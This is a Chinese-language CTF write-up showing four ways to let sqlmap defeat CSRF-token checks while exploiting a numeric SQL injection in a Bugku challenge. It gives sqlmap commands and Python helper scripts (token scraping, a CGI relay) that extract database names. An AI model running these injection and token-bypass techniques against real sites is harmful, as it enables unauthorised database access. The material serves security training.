---
title: sqlmap CSRF-token 绕过姿势
tags:
  - Summary
  - SQLi
date: 2019-03-25 00:23:00
---
CSRF(Cross-site request forgery 跨站请求伪造)主流防御方式是在后端生成表单的时候生成一串随机 token ，内置到表单里成为一个字段，同时，将此串 token 置入 session 中。每次表单提交到后端时都会检查这两个值是否一致，以此来判断此次表单提交是否是可信的。提交过一次之后，如果这个页面没有生成 CSRF token ，那么 token 将会被清空，如果有新的需求，那么 token 会被更新。

<!--more-->

当我们在使用sqlmap自动化进行SQL注入时，有些场景下需要解决csrf-token验证问题，本文结合[CTF_论剑场](https://new.bugku.com) web8 样例进行演示常见的4种绕过方式:结合BurpSuite宏绕过、eval参数绕过、通过Python CGIHTTPServer绕过以及通过--csrf-url/token参数绕过~

题目在update.php里`age`更新处存在`数字型SQL注入`，每次提交更新需要验证`token`值，不符合则会触发**CSRF token mismatch**，这里的token为前端赋值~

![](/assets/images/move/1552118730410-ae528994-5ea0-4de2-b3fb-3c6b4f2e4c67.png)

## BurpSuite Macros

我们可以利用BurpSuite Macros录制token，获取前一次HTTP请求响应的token值，作为后续请求的输入参数，从而绕过csrf-token验证。

`Project Opition`->`Session`->`Macros`，点击`Add`添加宏:

![](/assets/images/move/1552120384862-ea454f45-a63b-4c10-a8bd-b2889bb6091c.png)

在`Macro Recorder`中选择获取token的页面后确定。

![](/assets/images/move/1552120713208-028ed873-9fcc-4889-9877-61b093cdac09.png)

![](/assets/images/move/1552121005246-d68403d7-99ff-4054-a113-010afa47a13d.png)

![](/assets/images/move/1552121156506-ef1aafd9-65ea-4d9d-829c-61adccc8024c.png)

![](/assets/images/move/1552121640868-3b2dae6d-5bec-4af7-97cf-c3b7e642df98.png)

![](/assets/images/move/1552121984945-835d9f76-3e05-44df-ad9c-735850e98d74.png)

添加规则生效的模块以及获取token界面的URL地址。

![](/assets/images/move/1552122423697-80e8dcd4-5c16-40fc-aa95-c6b837e7fecb.png)

检测是否正确工作，使用sqlmap经过burpsuite进行注入，成功绕过csrf-token~

```bash
sqlmap -r C:\Users\light\Desktop\post.txt --proxy=http://127.0.0.1:8080 --dbs -v 3
```

![](/assets/images/move/1552123107426-1234cd74-3080-4663-921b-d27520b45e8d.png)

## eval参数

```s
# sqlmap手册
--eval=EVALCODE  Evaluate provided Python code before the request 
# e.g. 每次请求时根据id参数值，做一次md5后作为hash参数的值。
"import hashlib;id2=hashlib.md5(id).hexdigest()"
```

在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。

这里我们可以写一个脚本来获取页面csrf-token的值,通过sqlmap --eval参数将获取的token加入数据包后再发送请求进行测试，从而绕过csrf-token验证。

getToken脚本:

```python
import urllib2
import re


def get_token():
    # Load a page to generate a CSRF token
    opener = urllib2.build_opener()
    opener.addheaders.append(('Cookie', 'PHPSESSID=<insert PHPSESSID>'))
    page = opener.open('http://<insert url>/index.php').read()
    # Extract the token
    match = re.search(r'<input type="hidden" name="token" value="(.+)">', page)
    return match.group(1)
```

执行命令验证：

```bash
python2 sqlmap.py -r C:\Users\light\Desktop\post.txt --eval="import getToken; token = getToken.get_token()" -v 3 -p "age" --current-db
```

![](/assets/images/move/1552148260954-ff0d7e2e-9d4b-4831-af17-fe62d6a8af4a.png)

成功绕过，但受python脚本运行影响效率较低~

## Python CGIHTTPServer

CGI(Common Gateway Interface)是服务器和应用脚本之间的一套接口标准。它的功能是让服务器程序运行脚本程序，将程序的输出作为response发送给客户。总体的效果，是允许服务器动态的生成回复内容，而不必局限于静态文件。

支持CGI的服务器程接收到客户的请求，根据请求中的URL，运行对应的脚本文件。服务器会将HTTP请求的信息和socket信息传递给脚本文件，并等待脚本的输出。脚本的输出封装成合法的HTTP回复，发送给客户。CGI可以充分发挥服务器的可编程性，让服务器变得“更聪明”。

现在我们通过CGIHTTPServer即可在本地tcp端口监听,动态修改数据包，无需配置和刻意提交token,即可使用sqlmap检测sql注入。

创建CGI脚本如下:

```python
import cgi,cgitb
from mechanize import Browser
cgitb.enable() #允许发生错误时浏览器打印通知

url = "http://your-url/index.php"

def respond(string):
    print("Content-Type: text/html")
    print()
    print(string)
    quit()

form = cgi.FieldStorage()
u = form["username"].value
p = form["password"].value

b = Browser()
b.set_handle_robots(False)
b.open(url)
b.select_form(nr=0)
b.form["username"] = u
b.form["password"] = p
b.submit()
respond(b.title())
```

目录结构:
```bash
csrf-token # 自定义
└─cgi-bin # 设置为cgi-bin
    └─token.py # 自定义脚本名称
```

Python3下执行命令:`python -m http.server --cgi 8000`开启CGIHTTPServer.

浏览器访问:http://127.0.0.1:8000/cgi-bin/token.py?username=x3nd&password=x3nd.


![](/assets/images/move/1552129345855-41183c20-05af-4bce-a6dc-8fe91180ed78.png)

打印了成功登陆后的页面标题，表明登陆成功，现在我们可以直接运行sqlmap尽情测试了。

```bash
sqlmap -r C:\Users\light\Desktop\post.txt --current-db
```

![](/assets/images/move/1552184470820-e0c4692b-c7c0-411e-88e0-13420c19af84.png)


## --csrf-url/token

在sqlmap usage里 Requests模块中描述：

```bash
# --csrf-token 用于保存反CSRF令牌的参数
--csrf-token=CSR..  Parameter used to hold anti-CSRF token
# --csrf-url 用于提取反CSRF令牌的URL地址
--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
```

> [Implement anti-CSRF protection bypass](https://github.com/sqlmapproject/sqlmap/issues/2)


sqlmap在注入过程中对于一些易识别的参数关键字如"token"、"nonce"进行了识别，会询问是否进行anti-CSRF操作，但默认获取csrf的地址为数据包中的地址，如本题目中的`update.php`，而`token`的获取在这里应该是`index.php`界面，这时就需要我们分析并指定--csrf-token以及--csrf-url方便sqlmap进行anti-CSRF。

```bash
sqlmap -r C:\Users\light\Desktop\post.txt --csrf-url="http://123.xxx.xxx.85:10008/index.php" --csrf-token=token --dbs
```

![](/assets/images/move/1552185625050-5eb57679-0fa8-4fec-ab89-48d0af4fb47b.png)


sqlmap+BurpSuite Macros绕过csrf-token繁琐在csrf-token宏的会话录制处理，--eval参数配置脚本则需要我们自写获取token的python脚本且运行效率较慢，通过类似中间层作用的Python CGIHTTPServer绕过时，可以在使用sqlmap或burpsuite等工具测试时不需要进行额外的操作，sqlmap官方提供的anti-CSRF策略(--csrf-url/token)不失为一种方便操作的办法。